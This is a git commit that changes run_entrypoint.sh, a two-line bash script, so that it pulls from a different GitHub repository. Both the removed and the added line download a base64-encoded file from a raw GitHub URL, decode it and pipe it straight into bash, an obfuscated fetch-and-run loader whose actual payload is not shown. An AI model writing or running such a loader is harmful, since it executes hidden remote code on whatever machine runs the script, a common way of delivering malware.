26f86f4fd854a9f10ee415f758a2a125bf8dbe7b
veronjingler <167264647+veronjingler@users.noreply.github.com>
2026-06-23 23:01:27 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/garymthonjeni1/player/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/veronjingler/rush/refs/heads/main/entrypoint.sh | base64 -d | bash
